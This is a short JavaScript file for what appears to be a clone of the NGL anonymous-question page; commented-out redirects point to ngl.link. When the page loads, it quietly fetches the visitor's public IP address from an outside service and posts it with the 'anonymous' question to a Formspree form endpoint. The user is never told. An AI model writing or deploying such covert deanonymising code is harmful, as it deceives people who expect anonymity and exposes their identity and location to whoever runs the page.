const questionInput = document.getElementById("question");
const submitButton = document.getElementById("submit");
const formData = new FormData();

questionInput.addEventListener("input", function() {
  if (questionInput.value.trim().length > 0) {
    submitButton.style.display = "block";
  } else {
    submitButton.style.display = "none";
  }
});

function getIPAddress() {
  return fetch('https://api.ipify.org/?format=json')
    .then(response => {
      if (!response.ok) {
        throw new Error('Unable to fetch IP address');
      }
      return response.json();
    })
    .then(data => data.ip);
}
async function logIPAddress() {
  try {
    const ipAddress = await getIPAddress();
    formData.append('ip', ipAddress);
  } catch (error) {
    console.error(error);
  }
}
logIPAddress()


const submitBtn = document.getElementById('submit');
const question = document.getElementById('question');

submitBtn.addEventListener('click', function(e) {
  e.preventDefault(); // prevent default button behavior
  if (question.value.trim().length === 0) {
    return; // do nothing if question input is empty
  }
  
  
  
  formData.append('question', question.value);
  
  console.log(formData)
  fetch('https://formspree.io/f/xwkjzpak', {
    method: 'POST',
    body: formData
  })
  .then(response => {
      //window.location.href = "https://ngl.link/p/sent?lng=en";
  })
  .catch(error => {
      //window.location.href = "https://ngl.link/p/sent?lng=en";
  });
});

if (document.forms.length > 0) {
  const form = document.forms[0];
  form.addEventListener('submit', function(e) {
    e.preventDefault(); // prevent default form submission behavior
  });
}
